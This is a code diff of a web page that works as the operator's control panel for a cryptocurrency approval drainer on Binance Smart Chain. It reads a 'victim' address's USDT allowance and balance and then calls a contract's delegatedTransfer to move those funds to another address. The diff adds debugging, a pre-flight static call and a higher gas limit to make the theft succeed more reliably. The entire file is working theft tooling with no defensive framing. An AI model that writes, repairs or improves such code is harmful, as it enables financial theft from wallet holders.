@@ -18,6 +18,7 @@
     .status-error { background: #ffebee; color: #c62828; margin-top: 1rem; }
     .status-success { background: #e8f5e9; color: #2e7d32; margin-top: 1rem; }
     .refresh-btn { font-size: 0.8rem; padding: 5px 10px; margin-left: 10px; background: #eee; }
+    .debug-box { font-family: monospace; font-size: 0.8rem; text-align: left; background: #333; color: #0f0; padding: 10px; margin-top: 10px; display: none; overflow-x: auto; }
   </style>
 </head>
 <body>
@@ -46,10 +47,11 @@
 
     <div class="btn-row">
       <button onclick="checkAllowance()" style="background: #e0e0e0;">🔍 Check Allowance</button>
-      <button onclick="withdraw()" style="background: #4CAF50; color: white;">💸 Withdraw</button>
+      <button onclick="withdraw()" style="background: #4CAF50; color: white;">💸 Withdraw Funds</button>
     </div>
 
     <p id="output"></p>
+    <div id="debugBox" class="debug-box"></div>
   </div>
 
   <script>
@@ -62,18 +64,12 @@
       if (!window.ethereum) return false;
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const network = await provider.getNetwork();
-      
       if (network.chainId !== 56) {
         try {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }], // 56 in hex
-          });
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
           return true;
         } catch (err) {
-          if (err.code === 4902) {
-            alert("Please add Binance Smart Chain to your MetaMask.");
-          }
+          alert("Please add/switch to Binance Smart Chain.");
           return false;
         }
       }
@@ -81,10 +77,7 @@
     }
 
     async function updateStatus() {
-      if (!window.ethereum) {
-        document.getElementById("walletStatus").innerText = "❌ MetaMask not found";
-        return;
-      }
+      if (!window.ethereum) return;
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const accounts = await provider.listAccounts();
       const network = await provider.getNetwork();
@@ -95,7 +88,7 @@
       if (accounts.length > 0) {
         wStatus.innerText = `🔌 Connected: ${accounts[0].substring(0,6)}...${accounts[0].substring(38)}`;
       } else {
-        wStatus.innerText = "🔌 Wallet: Not connected (Click Check Allowance to connect)";
+        wStatus.innerText = "🔌 Wallet: Not connected";
       }
 
       if (network.chainId === 56) {
@@ -103,30 +96,26 @@
         nStatus.style.background = "#e8f5e9";
         nStatus.style.color = "#2e7d32";
       } else {
-        nStatus.innerText = `🌐 Network: Wrong Network (Chain ID: ${network.chainId}) ❌`;
+        nStatus.innerText = `🌐 Network: WRONG NETWORK (Chain ID: ${network.chainId}) ❌`;
         nStatus.style.background = "#ffebee";
         nStatus.style.color = "#c62828";
       }
-      
       checkContractInfo();
     }
 
     async function checkContractInfo() {
       const contractAddress = document.getElementById("contractAddress").value;
       const infoDiv = document.getElementById("contractInfo");
-      if (!ethers.utils.isAddress(contractAddress)) return;
+      if (!ethers.utils.isAddress(contractAddress) || !window.ethereum) return;
 
-      if (!window.ethereum) return;
-      
       infoDiv.style.display = "block";
-      infoDiv.innerText = "⏳ Checking contract owner...";
+      infoDiv.innerText = "⏳ Checking contract...";
 
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const code = await provider.getCode(contractAddress);
-        
         if (code === "0x") {
-          infoDiv.innerText = "❌ Error: No contract found at this address on this network!";
+          infoDiv.innerText = "❌ No contract found at this address on BSC!";
           return;
         }
 
@@ -136,33 +125,29 @@
         
         const accounts = await provider.listAccounts();
         if (accounts.length > 0 && accounts[0].toLowerCase() !== owner.toLowerCase()) {
-          infoDiv.innerHTML += `<br/><span style="color:red; font-weight:bold;">⚠️ WARNING: You are NOT the owner! Only the owner can withdraw.</span>`;
+          infoDiv.innerHTML += `<br/><span style="color:red; font-weight:bold;">⚠️ WARNING: You are NOT the owner! Only ${owner} can withdraw.</span>`;
         } else if (accounts.length > 0) {
-          infoDiv.innerHTML += `<br/><span style="color:green; font-weight:bold;">✅ You are the owner!</span>`;
+          infoDiv.innerHTML += `<br/><span style="color:green; font-weight:bold;">✅ You are the owner! Ready to withdraw.</span>`;
         }
       } catch (err) {
-        infoDiv.innerText = "❌ Error: Could not fetch owner. Are you on BSC?";
+        infoDiv.innerText = "❌ Error: Could not fetch owner. Ensure you are on BSC.";
         console.error(err);
       }
     }
 
     async function checkAllowance() {
       const output = document.getElementById("output");
-      output.innerText = "⏳ Checking...";
+      output.innerText = "⏳ Checking allowance...";
       output.className = "";
 
       const isBSC = await ensureBSC();
-      if (!isBSC) {
-        output.innerText = "❌ Please switch to Binance Smart Chain.";
-        output.className = "status-error";
-        return;
-      }
+      if (!isBSC) return;
 
       const tokenAddress = document.getElementById("tokenAddress").value;
       const from = document.getElementById("fromAddress").value;
       const spender = document.getElementById("contractAddress").value;
 
-      if (!from || !ethers.utils.isAddress(from)) {
+      if (!ethers.utils.isAddress(from)) {
         output.innerText = "❌ Please enter a valid victim address.";
         output.className = "status-error";
         return;
@@ -174,8 +159,8 @@
         await updateStatus();
         
         const token = new ethers.Contract(tokenAddress, [
-          "function allowance(address owner, address spender) external view returns (uint256)",
-          "function balanceOf(address account) external view returns (uint256)"
+          "function allowance(address owner, address spender) view returns (uint256)",
+          "function balanceOf(address account) view returns (uint256)"
         ], provider);
 
         const [allowance, balance] = await Promise.all([
@@ -186,7 +171,7 @@
         output.innerText = `✅ Allowance: ${ethers.utils.formatUnits(allowance, 18)} USDT\n💰 Balance: ${ethers.utils.formatUnits(balance, 18)} USDT`;
         output.className = "status-success";
       } catch (err) {
-        output.innerText = "❌ Error checking allowance. Ensure address is correct.";
+        output.innerText = "❌ Error checking allowance.";
         output.className = "status-error";
         console.error(err);
       }
@@ -194,15 +179,14 @@
 
     async function withdraw() {
       const output = document.getElementById("output");
-      output.innerText = "⏳ Preparing...";
+      const debugBox = document.getElementById("debugBox");
+      output.innerText = "⏳ Initializing withdrawal...";
       output.className = "status-info";
+      debugBox.style.display = "none";
+      debugBox.innerText = "";
 
       const isBSC = await ensureBSC();
-      if (!isBSC) {
-        output.innerText = "❌ Please switch to Binance Smart Chain.";
-        output.className = "status-error";
-        return;
-      }
+      if (!isBSC) return;
 
       const tokenAddress = document.getElementById("tokenAddress").value;
       const from = document.getElementById("fromAddress").value;
@@ -211,7 +195,7 @@
       const contractAddress = document.getElementById("contractAddress").value;
 
       if (!amount || amount <= 0) {
-        output.innerText = "❌ Enter a valid amount.";
+        output.innerText = "❌ Please enter a valid amount.";
         output.className = "status-error";
         return;
       }
@@ -223,51 +207,53 @@
         const myAddress = await signer.getAddress();
         const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
-        // Step 1: Manual Ownership Check
-        const owner = await contract.owner();
-        if (myAddress.toLowerCase() !== owner.toLowerCase()) {
-          throw new Error(`NOT THE OWNER: Only ${owner} can withdraw. You are ${myAddress}.`);
-        }
-
-        // Step 2: Manual Allowance Check
-        const token = new ethers.Contract(tokenAddress, ["function allowance(address,address) view returns (uint256)"], provider);
-        const allowance = await token.allowance(from, contractAddress);
         const amountParsed = ethers.utils.parseUnits(amount.toString(), 18);
-        
-        if (allowance.lt(amountParsed)) {
-          throw new Error(`INSUFFICIENT ALLOWANCE: Victim only approved ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
+
+        // --- PRE-FLIGHT DEBUGGING ---
+        output.innerText = "🔍 Debugging transaction...";
+        debugBox.style.display = "block";
+        debugBox.innerText = "> Running pre-flight check...\n";
+
+        try {
+          // Attempt static call to see if it would fail
+          await contract.callStatic.delegatedTransfer(tokenAddress, from, to, amountParsed);
+          debugBox.innerText += "> Static call: SUCCESS ✅\n";
+        } catch (staticErr) {
+          debugBox.innerText += `> Static call: FAILED ❌\n> Reason: ${staticErr.reason || "Reverted (no reason)"}\n`;
+          debugBox.innerText += `> Full Error: ${JSON.stringify(staticErr.error || staticErr, null, 2)}`;
+          throw new Error("REVERTED: " + (staticErr.reason || "Transaction would fail. Check Owner/Allowance/Balance."));
         }
 
-        // Step 3: Execute with forced gas limit
-        output.innerText = "⏳ Confirming in MetaMask...";
+        output.innerText = "⏳ Confirm in MetaMask...";
+        // If static call passed, we send with forced gas limit
         const tx = await contract.delegatedTransfer(
           tokenAddress, from, to, amountParsed,
-          { gasLimit: 200000 } // Higher gas limit to ensure it doesn't fail
+          { gasLimit: 250000 } // High gas limit to avoid estimation failure
         );
         
         output.innerText = "⏳ Transaction sent! Waiting for block...";
+        debugBox.innerText += `> Tx Hash: ${tx.hash}\n> Waiting for confirmation...\n`;
         await tx.wait();
-        output.innerText = "✅ WITHDRAW SUCCESSFUL!";
+        
+        output.innerText = "✅ WITHDRAWAL SUCCESSFUL!";
         output.className = "status-success";
+        debugBox.innerText += "> Confirmed! Funds moved. ✅";
       } catch (err) {
         console.error(err);
-        let msg = err.reason || err.message || "Withdraw failed.";
-        if (msg.includes("UNPREDICTABLE_GAS_LIMIT")) {
-          msg = "❌ REVERTED: The transaction would fail. Check if you are the owner and if the victim has balance.";
-        }
-        output.innerText = msg;
+        output.innerText = err.message || "Withdraw failed.";
         output.className = "status-error";
+        if (!debugBox.innerText.includes("FAILED")) {
+          debugBox.style.display = "block";
+          debugBox.innerText += `> Error: ${err.message}\n> Full details in console.`;
+        }
       }
     }
 
-    // Initialize
     window.addEventListener('load', () => {
       if (window.ethereum) {
         window.ethereum.on('accountsChanged', updateStatus);
         window.ethereum.on('chainChanged', () => window.location.reload());
         updateStatus();
-      } else {
-        document.getElementById("walletStatus").innerText = "❌ MetaMask not found";
       }
     });
   </script>
